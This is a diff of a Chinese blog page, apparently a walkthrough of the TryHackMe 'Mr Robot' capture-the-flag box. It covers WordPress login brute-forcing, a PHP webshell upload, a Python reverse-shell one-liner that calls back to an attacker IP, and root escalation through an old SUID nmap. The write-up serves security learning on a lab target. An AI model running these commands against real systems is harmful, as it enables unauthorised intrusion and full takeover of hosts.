@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>TryHackMe Mr Robot ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -114,76 +124,84 @@
           <div class="post_content">
               <p>来自tryhackme的Mr Robot CTF</p>
 <p>访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。</p>
-<pre><code>http://10.10.188.224/http:/10.10.188.224/
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728135544303.png" alt="image-20200728135544303"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.188.224&#x2F;http:&#x2F;10.10.188.224&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728135544303.png" alt="image-20200728135544303"></p>
 <p>然后查找一个其他页面是否有别的信息。</p>
-<pre><code>python dirbrute.py http://10.10.188.224/ -t 20 -d ./dics/DirBuster/directory-list-2.3-medium.txt
-</code></pre><p>查找到部分信息</p>
-<pre><code>http://10.10.188.224/sitemap
-http://10.10.188.224/rss
-http://10.10.188.224/login
-http://10.10.188.224/feed
-http://10.10.188.224/0
-http://10.10.188.224/atom
-http://10.10.188.224/image
-http://10.10.188.224/wp-content
-http://10.10.188.224/admin
-http://10.10.188.224/intro
-http://10.10.188.224/wp-login
-http://10.10.188.224/rss2
-http://10.10.188.224/license
-http://10.10.188.224/Image
-http://10.10.188.224/rdf
-http://10.10.188.224/page1
-http://10.10.188.224/readme
-http://10.10.188.224/robots
-......
-</code></pre><p>其中robots文件中提示我们有两个文件</p>
-<pre><code>fsocity.dic
-key-1-of-3.txt
-</code></pre><p>其中<code>key-1-of-3.txt</code>就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个<code>Elliot</code>用户。</p>
+<pre class="line-numbers language-none"><code class="language-none">python dirbrute.py http:&#x2F;&#x2F;10.10.188.224&#x2F; -t 20 -d .&#x2F;dics&#x2F;DirBuster&#x2F;directory-list-2.3-medium.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查找到部分信息</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.188.224&#x2F;sitemap
+http:&#x2F;&#x2F;10.10.188.224&#x2F;rss
+http:&#x2F;&#x2F;10.10.188.224&#x2F;login
+http:&#x2F;&#x2F;10.10.188.224&#x2F;feed
+http:&#x2F;&#x2F;10.10.188.224&#x2F;0
+http:&#x2F;&#x2F;10.10.188.224&#x2F;atom
+http:&#x2F;&#x2F;10.10.188.224&#x2F;image
+http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-content
+http:&#x2F;&#x2F;10.10.188.224&#x2F;admin
+http:&#x2F;&#x2F;10.10.188.224&#x2F;intro
+http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-login
+http:&#x2F;&#x2F;10.10.188.224&#x2F;rss2
+http:&#x2F;&#x2F;10.10.188.224&#x2F;license
+http:&#x2F;&#x2F;10.10.188.224&#x2F;Image
+http:&#x2F;&#x2F;10.10.188.224&#x2F;rdf
+http:&#x2F;&#x2F;10.10.188.224&#x2F;page1
+http:&#x2F;&#x2F;10.10.188.224&#x2F;readme
+http:&#x2F;&#x2F;10.10.188.224&#x2F;robots
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中robots文件中提示我们有两个文件</p>
+<pre class="line-numbers language-none"><code class="language-none">fsocity.dic
+key-1-of-3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>其中<code>key-1-of-3.txt</code>就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个<code>Elliot</code>用户。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728151142975.png" alt="image-20200728151142975"></p>
 <p>然后再去爆破密码，原字典里发现有不少重复的单词，去重后发现数量少了一大半，就这是用来消耗你时间的啊？</p>
-<p>使用在线去重：<a href="https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为" target="_blank" rel="noopener">https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为</a></p>
+<p>使用在线去重：<a target="_blank" rel="noopener" href="https://tool.lanrentuku.com/quchong/%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AA%E5%89%A9%E4%B8%80%E4%B8%87%E5%A4%9A%E6%9D%A1%E6%95%B0%E6%8D%AE%E3%80%82%E7%BB%8F%E8%BF%87%E6%BC%AB%E9%95%BF%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81%E4%B8%BA">https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为</a></p>
 <p><code>ER28-0652</code>，登陆后台。</p>
 <p>同过后台上传插件，上传一个php文件，虽然会显示上传失败，但是文件已经上传</p>
-<pre><code>http://10.10.188.224/wp-content/uploads/2020/07/1.php
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162306251.png" alt="image-20200728162306251"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-content&#x2F;uploads&#x2F;2020&#x2F;07&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162306251.png" alt="image-20200728162306251"></p>
 <p>上传的是一句话，使用蚁剑连接即可。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162409252.png" alt="image-20200728162409252"></p>
 <p>为了方便操作命令，反弹一个shell回来。</p>
-<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.6.4.191\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;
-</code></pre><p>反弹回来后，利用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>来升级shell模式。</p>
+<pre class="line-numbers language-none"><code class="language-none">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.6.4.191\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>反弹回来后，利用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>来升级shell模式。</p>
 <p>在<code>/home/robot</code>目录下发现一个文件，其中包含的<code>robot:c3fcd3d76192e4007dfb496cca67e13b</code>解密是<code>abcdefghijklmnopqrstuvwxyz</code>，用户robot的密码可能就是这个。</p>
 <p>更改到这个用户后，目录下就有我们需要的第二个key。</p>
 <p>然后使用此用户提权，先查看一个SUID文件，<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
 <p>结果中看到这个文件，nmap在版本低于5.21的时候，可以提权</p>
-<pre><code>/usr/local/bin/nmap  
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap  
 
-nmap version 3.81
-</code></pre><p>利用nmap提权获取root：</p>
-<pre><code>robot@linux:~$ nmap --interactive
+nmap version 3.81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>利用nmap提权获取root：</p>
+<pre class="line-numbers language-none"><code class="language-none">robot@linux:~$ nmap --interactive
 nmap --interactive
 
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Starting nmap V. 3.81 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )
 Welcome to Interactive Mode -- press h &lt;enter&gt; for help
 nmap&gt; !sh
 !sh
 # id
 id
-uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
-#
-</code></pre><p>在root目录下就可以看到<code>firstboot_done</code>文件和最后一个key，到此就算是结束了。</p>
+uid&#x3D;1002(robot) gid&#x3D;1002(robot) euid&#x3D;0(root) groups&#x3D;0(root),1002(robot)
+#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在root目录下就可以看到<code>firstboot_done</code>文件和最后一个key，到此就算是结束了。</p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2020/07/TryHackMe-Mr-Robot/">/2020/07/TryHackMe-Mr-Robot/</a>
-                    <p>发表日期：<a href="/2020/07/TryHackMe-Mr-Robot/">July 28th 2020, 4:56:29 pm</a>
-                    <p>更新日期：<a href="/2020/07/TryHackMe-Mr-Robot/">July 28th 2020, 4:56:29 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/">https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/">July 28th 2020, 4:56:29 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/">July 28th 2020, 4:56:29 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -221,7 +239,7 @@ uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2020/07/TryHackMe-Mr-Robot/'; 
+            this.page.url = 'https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/'; 
             this.page.identifier = '/2020/07/TryHackMe-Mr-Robot/';
         };
         (function() { 
@@ -232,7 +250,7 @@ uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -252,16 +270,32 @@ uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
